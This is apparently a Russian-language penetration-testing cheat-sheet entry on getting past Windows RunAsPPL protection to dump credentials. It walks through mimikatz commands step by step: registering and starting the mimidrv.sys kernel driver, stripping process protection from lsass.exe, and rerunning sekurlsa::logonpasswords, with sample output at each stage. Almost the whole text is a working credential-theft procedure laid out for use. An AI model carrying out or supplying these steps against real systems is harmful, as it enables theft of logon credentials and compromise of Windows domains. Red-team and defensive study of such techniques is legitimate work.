#process #memory #creds #AD #windows 

## Обход защиты `RunAsPPL`

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

Значит флаг `RunAsPPL` установлен в `1`
Как обойти защиту

1) Импортируем модуль `mimidrv.sys`

Он работает на уровне ядра и может отключить это флаг

```markup
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

2) Отключаем защиту
```
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

3) Запускаем
```
mimikatz # sekurlsa::logonpasswords
```